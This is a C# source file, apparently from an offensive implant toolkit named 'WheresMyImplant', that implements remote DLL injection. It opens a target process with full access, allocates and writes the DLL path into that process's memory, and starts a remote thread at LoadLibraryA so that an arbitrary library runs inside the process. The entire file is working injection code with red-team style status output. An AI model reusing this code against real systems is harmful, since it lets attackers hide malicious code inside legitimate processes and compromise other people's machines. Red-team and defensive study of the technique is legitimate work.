using System;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    internal sealed class LoadDllRemote : Base, IDisposable
    {
        private IntPtr hProcess;
        private IntPtr hThread;
        private IntPtr libraryPtr;
        private String library;
        private UInt32 processId;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal LoadDllRemote(String library, UInt32 processId)
        {
            this.library = library;
            this.processId = processId;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("[*] Attempting to get handle on {0}", processId);
            hProcess = kernel32.OpenProcess(/*kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ*/ kernel32.PROCESS_ALL_ACCESS, false, processId);
            if (IntPtr.Zero == hProcess)
            {
                Console.WriteLine("[-] Unable to open process");
                return;
            }
            Console.WriteLine("[+] Handle: 0x{0}", hProcess.ToString("X4"));

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hModule = kernel32.GetModuleHandle("kernel32.dll");
            if (IntPtr.Zero == hModule)
            {
                Console.WriteLine("[-] Unable to open module handle to kernel32.dll");
                return;
            }
            Console.WriteLine("[+] Module Handle: 0x{0}", hModule.ToString("X4"));

            IntPtr loadLibraryAddr = kernel32.GetProcAddress(hModule, "LoadLibraryA");
            if (IntPtr.Zero == loadLibraryAddr)
            {
                Console.WriteLine("[-] Unable to open module handle to LoadLibraryA");
                return;
            }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)((library.Length + 1) * Marshal.SizeOf(typeof(char)));
            Console.WriteLine("[*] Attempting to allocate memory");
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
            if (IntPtr.Zero == lpBaseAddress)
            {
                Console.WriteLine("[-] Unable to allocate memory");
                return;
            }
            Console.WriteLine("[+] Allocated {0} bytes at 0x{1}", dwSize, lpBaseAddress.ToString("X4"));
            Console.WriteLine("[+] Memory Protection Set to PAGE_READWRITE");

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpNumberOfBytesWritten = 0;
            libraryPtr = Marshal.StringToHGlobalAnsi(library);
            Console.WriteLine("[*] Attempting to write process memory");
            if (!kernel32.WriteProcessMemory(hProcess, lpBaseAddress, libraryPtr, dwSize, ref lpNumberOfBytesWritten))
            {
                Console.WriteLine("[-] WriteProcessMemory Failed");
                return;
            }
            Console.WriteLine("[+] Wrote {0} bytes", lpNumberOfBytesWritten);

            ////////////////////////////////////////////////////////////////////////////////
            Winnt.MEMORY_PROTECTION_CONSTANTS lpflOldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
            Console.WriteLine("[*] Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
            if (!kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref lpflOldProtect))
            {
                Console.WriteLine("[-] VirtualProtectEx Failed");
                return;
            }
            Console.WriteLine("[+] Set Memory Protection to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            Console.WriteLine("[*] Attempting to start remote thread");
            hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, loadLibraryAddr, lpBaseAddress, dwCreationFlags, ref threadId);
            if (IntPtr.Zero == hThread)
            {
                Console.WriteLine("[-] CreateRemoteThread Failed");
                return;
            }

            Console.WriteLine("[+] Started Thread: 0x{0}", hThread.ToString("X4"));

            ///////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        ~LoadDllRemote()
        {
            Dispose();
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (IntPtr.Zero != hProcess)
            {
                kernel32.CloseHandle(hProcess);
            }

            if (IntPtr.Zero != hThread)
            {
                kernel32.CloseHandle(hThread);
            }

            if (IntPtr.Zero != libraryPtr)
            {
                Marshal.FreeHGlobal(libraryPtr);
            }
        }
    }
}